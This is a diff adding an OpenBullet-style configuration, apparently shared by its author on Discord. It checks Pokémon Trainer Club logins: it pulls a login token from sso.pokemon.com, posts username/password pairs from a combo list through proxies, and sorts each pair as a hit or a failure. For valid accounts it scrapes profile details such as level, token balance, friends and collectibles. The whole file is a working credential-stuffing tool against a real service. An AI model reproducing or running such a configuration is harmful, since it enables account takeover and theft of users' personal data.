@@ -1,0 +1,133 @@
+[SETTINGS]
+{
+  "Name": "Pokemon Go",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-08T19:05:38.4593469+00:00",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#get_token REQUEST GET "https://sso.pokemon.com/sso/login?locale=en&service=https://club.pokemon.com/us/pokemon-trainer-club/caslogin" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Token PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"lt\" value=\"" "\" />" -> VAR "token" 
+
+#Execution PARSE "<SOURCE>" LR "type=\"hidden\" name=\"execution\" value=\"" "\"" -> VAR "Exec" 
+
+#login REQUEST POST "https://sso.pokemon.com/sso/login?locale=en&service=https://club.pokemon.com/us/pokemon-trainer-club/caslogin" 
+  CONTENT "lt=<token>&execution=<Exec>&_eventId=submit&username=<USER>&password=<PASS>&Login=Sign+In" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: sso.pokemon.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: 134" 
+  HEADER "Origin: https://sso.pokemon.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://sso.pokemon.com/sso/login?locale=en&service=https://www.pokemon.com/us/pokemon-trainer-club/caslogin" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Your username or password is incorrect" 
+  KEYCHAIN Success OR 
+    KEY "Log Out" 
+
+#Get_Profile REQUEST GET "https://www.pokemon.com/us/pokemon-trainer-club/my-profile/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Cookies PARSE "<COOKIES(op_session_id)>" LR "" "" -> VAR "Session" 
+
+#Time FUNCTION CurrentUnixTime -> VAR "Time" 
+
+#Get_Time REQUEST GET "https://www.pokemon.com/api/users/details?_=<TIME>" 
+  
+  COOKIE "_c: 1" 
+  COOKIE "django_language: en" 
+  COOKIE "op_session_id: <Session>" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-NewRelic-ID: VQ4OWFZXGwIAXFZTBgI=" 
+  HEADER "X-Referer: /us/pokedex/" 
+
+#user_id PARSE "<SOURCE>" LR "\"id\":" "," -> VAR "user id" 
+
+#Name PARSE "<SOURCE>" JSON "name" CreateEmpty=FALSE -> CAP "Name" 
+
+#Total_Friends PARSE "<SOURCE>" LR "\"friendRequests\":" "," CreateEmpty=FALSE -> CAP "Total Friends" 
+
+#Avatar_Gender PARSE "<SOURCE>" LR "\"avatarGender\":\"" "\"" CreateEmpty=FALSE -> CAP "Avatar Gender" 
+
+#has_OP PARSE "<SOURCE>" LR "\"has_op\":" "," CreateEmpty=FALSE -> CAP "has OP" 
+
+#Stamps PARSE "<SOURCE>" LR "stamps\":[" "]," CreateEmpty=FALSE -> CAP "Stamps" 
+
+#Collectibles_Cards PARSE "<SOURCE>" LR "collectibles\":{\"cards\":{\"have\":[" "]," CreateEmpty=FALSE -> CAP "Collectibles Cards" 
+
+#Level PARSE "<SOURCE>" LR "\"level\":" "," -> CAP "Level" 
+
+#Token_Balance PARSE "<SOURCE>" LR "tokenBalance\":" "," -> CAP "Token Balance" 
+
+REQUEST GET "https://www.pokemon.com/us/play-pokemon/leaderboards/tcgo/api/overall/?leaderboard_type=play&leaderboard_when=LastCurrentSeason&leaderboard_who=&per_page=25&page=1&include=metadata&format=json" 
+  
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0" 
+  HEADER "Pragma: no-cache" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "sign-in-rank" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "sign-in-rank" 
+  
